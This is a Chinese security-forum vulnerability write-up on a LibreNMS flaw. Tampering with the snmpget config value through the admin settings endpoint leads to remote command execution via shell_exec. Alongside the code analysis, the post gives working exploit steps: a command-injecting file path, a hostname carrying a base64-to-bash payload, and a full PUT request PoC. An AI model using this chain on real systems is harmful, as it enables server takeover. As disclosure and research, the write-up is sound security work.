---
title: 当配置成了炸弹：利用 LibreNMS snmpget 配置篡改实现 RCE 的完整攻击链
url: https://forum.butian.net/share/4636
source: 奇安信攻防社区
date: 2025-11-10
fetch_date: 2025-11-11T03:12:40.685506
---

# 当配置成了炸弹：利用 LibreNMS snmpget 配置篡改实现 RCE 的完整攻击链

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### 当配置成了炸弹：利用 LibreNMS snmpget 配置篡改实现 RCE 的完整攻击链

* [漏洞分析](https://forum.butian.net/topic/48)

本文详细分析了一个基于Laravel框架的系统LibreNMS中存在的配置篡改与任意命令执行漏洞。通过路由分析，揭示了系统中SettingsController类的update方法存在的安全隐患。攻击者可以通过篡改配置文件中的snmpget键值，利用shell\_exec函数执行任意系统命令。

本文详细分析了一个基于Laravel框架的系统LibreNMS中存在的配置篡改与任意命令执行漏洞。通过路由分析，揭示了系统中`SettingsController`类的`update`方法存在的安全隐患。攻击者可以通过篡改配置文件中的`snmpget`键值，利用`shell\_exec`函数执行任意系统命令。
1. 路由分析
=======
该系统是基于Laravel 框架开发的，并使用Illuminate 作为路由，在route目录下定义了api，web和console不同业务方面的路由，
![image-20251030113153780](https://oss-yg-cztt.yun.qianxin.com/butian-public/fee9bdfbb34de554e1fe1f230a96684e2.png)
例如在这个路由下，使用了 `can:admin` 中间件来验证用户是否具有管理员权限。并且为settings定义了三中请求方式，当使用put请求/settings/1路径时候，就会调用`SettingsController`类下的`update`方法，传入的参数为1。如果参数后面有`?`则代表该参数为可选参数。
2. 漏洞分析
=======
首先来看最终的漏洞点：
![image-20251030113210019](https://oss-yg-cztt.yun.qianxin.com/butian-public/f7b31429df24f1f33c2351daa66bb4522.png)
这里在访问about页面时，`version\_netsnmp`的结果是通过执行`shell\_exec`得到的结果，`shell\_exec`执行的是系统命令，这里是通过在config中获取键为`snmpget`的值进行执行的，这里默认是`snmpget`的命令路径。
这里如果可以修改config中键对应的值对，那么就可以修改config从而将`snmpget`的值进行替换，达到任意命令执行。
接下来查看这个`Config`这个类，通过查看`Config`类的结构，发现不光有`get`方法还有`set`方法。
![image-20251030113224159](https://oss-yg-cztt.yun.qianxin.com/butian-public/f219c80ffe120ce01b28933ca8223502f.png)
所以只需要查找哪里存在`Config::set`方法，且参数可控的地方。但是经过全局搜索`Config:set`关键字，并没有发现可以利用的地方，基本所有的第一个参数都被固定了。
![image-20251030113231929](https://oss-yg-cztt.yun.qianxin.com/butian-public/f58931ac2051bab95233cd306fdf4a405.png)
其实除此之外还有两种方式来进行set：
第一种是查看在`Config`类里面搜索有没有其他地方对`set`其进行了调用。通过`self::set`关键字进行搜索，发现确实有很多很多，但经过筛查还是没有能直接利用的
![image-20251030113239999](https://oss-yg-cztt.yun.qianxin.com/butian-public/f19ce121d18c9cef15444edf401022c8c.png)
第二种是查看set方法中的实现逻辑，看哪里也用了相同的逻辑：
![image-20251030113248259](https://oss-yg-cztt.yun.qianxin.com/butian-public/f5c5e59181124c429957e8d97ec4bb2d4.png)
发现在`set`方法中实际是使用的 `Arr::set` 方法。`Arr` 是 Laravel 框架中的一个辅助类，提供了一些常用的数组操作方法，旨在简化数组的处理过程。在这里的`self::$config`是一个数组，所以可以通过`Arr`的相关方法处理。
![image-20251030113257903](https://oss-yg-cztt.yun.qianxin.com/butian-public/f8421ddd8c01503d7b8e90e293e35b45e.png)
所以这里搜索`Arr::set`关键字发现在`persist`方法中使用了，并且`$key`和`$value`参数没有写死，是通过传参来的，然后通过正则搜索`Config::persist\(\$\w+?, \$\w+?\)`全局查找哪里调用了该方法。
![image-20251030113309105](https://oss-yg-cztt.yun.qianxin.com/butian-public/f8fa6294c134914351dcb0ba0341bc600.png)
最终找到这样一处，在`SettingsController`的`update`方法里，代码如下：
class SettingsController extends Controller
{
...
public function update(DynamicConfig $config, Request $request, $id)
{
$value \\= $request-&gt;get('value');
​
if (! $config-&gt;isValidSetting($id)) { // 对id进行检查
return $this-&gt;jsonResponse($id, ':id is not a valid setting', null, 400);
}
​
$current \\= \\LibreNMS\\Config::get($id);
$config\\_item \\= $config-&gt;get($id);
​
if (! $config\\_item-&gt;checkValue($value)) { // 对value进行检查
return $this-&gt;jsonResponse($id, $config\\_item-&gt;getValidationMessage($value), $current, 400);
}
​
if (\\LibreNMS\\Config::persist($id, $value)) { // 漏洞点
return $this-&gt;jsonResponse($id, "Successfully set $id", $value);
}
​
return $this-&gt;jsonResponse($id, 'Failed to update :id', $current, 400);
}
...
}
在进行`persist`之前分别会对会对`$value`进行`checkValue`检查，在`checkValue`中，由于这里value的类型是`executable`，所以value的值需要同时满足是是一个可执行文件。由于这里只能执行一个单一可执行文件而不能携带参数，所以在没有上传点的情况下很鸡肋。
![image-20251030113322296](https://oss-yg-cztt.yun.qianxin.com/butian-public/f73793e53d12c95db36766985c60f2870.png)
但也不是没有办法，因为最后执行命令使用过`shell\_exec`进行执行的，它通过 shell 执行命令并将完整的输出以字符串的方式返回。既然执行的是shell命令，那么就可以使用`;`分号将执行多个命令，并且在进行检查时并没有限制路径穿越，\*\*如果某个目录中包含以`;`包裹的命令，就可以做到任意命令执行\*\*，例如将`snnpget`的值设置为
`/tmp/;ping a12dsa.dnslog.cn;#/../../../bin/ls`
这样既可以通过`is\_file($value) && is\_executable($value);`的检查，也可以在后续的`shell\_exec`执行两个分号里面的命令,`#`将后面的内容进行注释。
（如果命令中出现`/`等在目录命名不合规的命令，可以考虑使用base64的方式执行，例如`echo cGluZyBhMTJkc2EuZG5zbG9nLmNu | base64 -d | bash`）
所以接下来就是查找哪里可以创建自定义目录的地方。php中创建目录的方法是`mkdir`。当然重命名目录也是可以的，使用的方法是`rename`。这里全局搜索`rename(`
![image-20251030113339563](https://oss-yg-cztt.yun.qianxin.com/butian-public/f80c7d5bb906f56f2f683e2fe6f80170d.png)
这里找到这样一处
![image-20251030113348508](https://oss-yg-cztt.yun.qianxin.com/butian-public/f363d7f61c98cebd90f6c399989b582f2.png)
通过方法名可以看到这里是重命名host的函数。所以首先可以添加一个设备，host任意，然后修改设备host为payload即可
3. 漏洞复现
=======
首先点击Device-Add Device，然后Hostname or IP随便写后添加设备
![image-20251030113400709](https://oss-yg-cztt.yun.qianxin.com/butian-public/f3994f9f20b1cb79bb2e02d6a6d504350.png)
添加时如果对应的ip没有开启snmpd或无法ping通可能会添加失败，可以选择Force add强制添加，
![image-20251030113410226](https://oss-yg-cztt.yun.qianxin.com/butian-public/fda60cfe1a973551a5083d958b92fc9e4.png)
然后等待几分钟，系统设置了计划任务等待轮询器poll设备，这时会在rdd目录下创建一个同host的文件用来保存监控图像。
然后转到device界面，点击右上角设置，修改hostname，这里修改hostname为`xxx; echo dG91Y2ggL3RtcC92dWxuX3Rlc3Q= | base64 -d | bash;#`后确认，这里的payload为`touch /tmp/vuln\_test`
![image-20251030113419662](https://oss-yg-cztt.yun.qianxin.com/butian-public/fff0091277e52231544f7c6bbf1b15cec.png)
这是查看目录已经被修改
![image-20251030113433320](https://oss-yg-cztt.yun.qianxin.com/butian-public/f53d4ed3072ee1403bb655f3f32a9996d.png)
然后修改snmpget的路径，前面分析相关功能在`SettingsController`路径下，根据路由信息使用put方法请求`/settings/snmpget`路径，
![image-20251030113426291](https://oss-yg-cztt.yun.qianxin.com/butian-public/fcd91c95de1d52fcee6d0c468d8d10e89.png)
poc:
PUT /settings/snmpget HTTP/1.1
Cookie:
X-Requested-With: XMLHttpRequest
Host: xxx
Accept: application/json, text/plain, \\*/\\*
Content-Type: application/json
Origin: <http://69.165.65.134>
Proxy-Connection: keep-alive
Content-Length: 16
​
{"value":"../rrd/xxx; echo dG91Y2ggL3RtcC92dWxuX3Rlc3Q= | base64 -d | bash;#/../../../../bin/echo"}
![image-20251030113445066](https://oss-yg-cztt.yun.qianxin.com/butian-public/ff36c67e653d5b44cb122598d1dc121bb.png)
然后访问`/about`路径触发`shell\_exec`，然后查看服务器`/tmp`路径发现命令执行成功。

* 发表于 2025-11-10 10:00:00
* 阅读 ( 406 )
* 分类：[漏洞分析](https://forum.butian.net/community/Vul_analysis)

1 推荐
 收藏

## 0 条评论

请先 [登录](https://forum.butian.net/login) 后评论

[![中铁13层打工人](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/bd481171367dd9c7aac272bf517c972393f08b4.jpg)](https://forum.butian.net/people/77)

[中铁13层打工人](https://forum.butian.net/people/77)

84 篇文章

[奇安信攻防社区](https://forum.butian.net)|
联系我们

|
[sitemap](https://forum.butian.net/sitemap)

Copyright © 2013-2023 BUTIAN.NET 版权所有 [京ICP备18014330号-2](https://beian.miit.gov.cn/#/Integrated/index)

×

#### 发送私信

请先 [登录](https://forum.butian.net/login) 后发送私信

×

#### 举报此文章

垃圾广告信息：
广告、推广、测试等内容

违规内容：
色情、暴力、血腥、敏感信息等内容

不友善内容：
人身攻击、挑衅辱骂、恶意行为

其他原因：
请补充说明

举报原因:

取消
举报

×

#### ![中铁13层打工人](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/bd481171367dd9c7aac272bf517c972393f08b4.jpg)

如果觉得我的文章对您有用，请随意打赏。你的支持将鼓励我继续创作！

![]()

---